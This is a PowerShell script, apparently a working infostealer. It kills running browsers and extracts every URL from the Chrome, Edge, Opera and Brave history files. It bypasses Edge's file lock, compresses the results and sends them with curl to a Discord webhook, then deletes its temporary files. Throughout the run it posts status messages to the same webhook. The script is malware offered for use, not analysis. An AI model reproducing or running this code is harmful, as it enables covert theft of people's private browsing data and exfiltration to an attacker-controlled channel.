# Get the current username
function HistoryLover {

    $ex = ".tmp"
    $tempPath = $Env:TEMP
    $fileOut = generateFileName
    $fileOut = $fileOut + $ex
    $fileOut = $tempPath + "\" + $fileOut
    $UserName = $Env:UserName

    # Define the paths for each browser's History file
    $Browsers = @{
        "Chrome" = "$Env:LocalAppData\Google\Chrome\User Data\Default\History"
        "Edge"   = "$Env:LocalAppData\Microsoft\Edge\User Data\Default\History"
        "Opera"  = "$Env:AppData\Opera Software\Opera Stable\Default\History"
        "Brave"  = "$Env:LocalAppData\BraveSoftware\Brave-Browser\User Data\Default\History"
    } # ADD OTHERS
    
    # Regular expression to extract full URLs
    $Regex = '(https?:\/\/[^\s"]+)'
    
    # Loop through each browser and extract history

    $records = @{}

    foreach ($Browser in $Browsers.Keys) {
        $Path = $Browsers[$Browser]
        quitx($Browser)
        Start-Sleep -s 0.5
        # Check if the History file exists
        if (Test-Path -Path $Path) {
           
            if ($Browser -eq "Edge") {
                # Because Edge is locked because is used by some Windows process, the easiest way to bypass this is copy the content into another file 
                Get-Content $Path > $fileOut
                $Path = $fileOut
            }
            try {
                $RawData = [System.IO.File]::ReadAllText($Path) -join " "
    
                $Matches = [regex]::Matches($RawData, $Regex) | ForEach-Object { $_.Value } | Sort-Object -Unique
                $records.Add($Browser, $Matches)
                if ($Browser -eq "Edge") {
                    #removeFile -path $Path
                }
            }
            catch {
                $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
                sendMessage($message)
            }
            

        }
        else {
            sendMessage("Could not find history file for $Browser.")
        }
    }
    $records | ConvertTo-Json -Depth 10 | Out-File -FilePath $fileOut -Force
    sendMessage("Start of Browsers History dumping:")


    $compressedFile = compress -path $fileOut # History files can be a lot big, compression is a must

    $result = discordExfiltration -fileOut $compressedFile

    
    removeFile -path $compressedFile
    removeFile -path $fileOut
    sendMessage("End of Browsers History dumping")

}

function removeFile {
    param(
        $path
    )
    if (Test-Path $path) {
    
        Remove-Item -Path "$path" -Force
        $message = "File at $path deleted;)"
        sendMessage($message)
    
    }
    else {
        $message = "I was not able to remove the file at $path....What happened?"
        sendMessage($message)
    }
        
}

Function generateFileName {
    # Generate a random string using characters from the specified ranges
    $fileName = -join ((48..57) + (65..90) + (97..122) | ForEach-Object { [char]$_ } | Get-Random -Count 5)
    return $fileName
}


function compress {
    param (
        $path
    )
    $tempPath = $Env:TEMP
    $fileName = generateFileName
    $compressedFile = $tempPath + "\" + $fileName + ".tar.xz"
    try {
        $tarCommand = "tar.exe -cvJf '$compressedFile' '$path'"
        Invoke-Expression $tarCommand *> $null
    } 
    catch {
        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
        sendMessage($message)
    }
    

    return $compressedFile
}

function quitx($browser) {
    $browser = [io.path]::GetFileNameWithoutExtension($browser)
    $browser = $browser.ToLower()
    if (Get-Process -Name $browser -ErrorAction SilentlyContinue) {
        Stop-Process -Name $browser -Force
    }
}

function sendMessage {
    param(
        $message
    )
    $payload = @{ content = $message } | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
}

function discordExfiltration {
    param(
        $fileOut
    )
    try {
        # Path to your JSON file
        $jsonFilePath = $fileOut
            
            
        # Ensure the file exists before sending it
        if (Test-Path $jsonFilePath) {
            $fileSize = Get-ItemProperty -Path $fileOut | Select-Object -ExpandProperty Length

            if ($fileSize -gt 10000000) {
                return $fileOut
            }
            try {
                $curlCommand = "curl.exe -w '%{http_code}' -s -X POST $hookUrl -F 'file=@$jsonFilePath' -H 'Content-Type: multipart/form-data' | Out-Null"
                Invoke-Expression $curlCommand
    
            }
            catch {
                $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
                sendMessage($message)
            }
    
                
        }
        else {
            $message = "The JSON file was not found. Please check the file path."
            sendMessage($message)
        }
    }
    catch {
        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
        sendMessage($message)
    }
        
}


$hookUrl = "https://discord.com/api/webhooks/XXXXXX" # CHANGE THIS

HistoryLover | Out-Null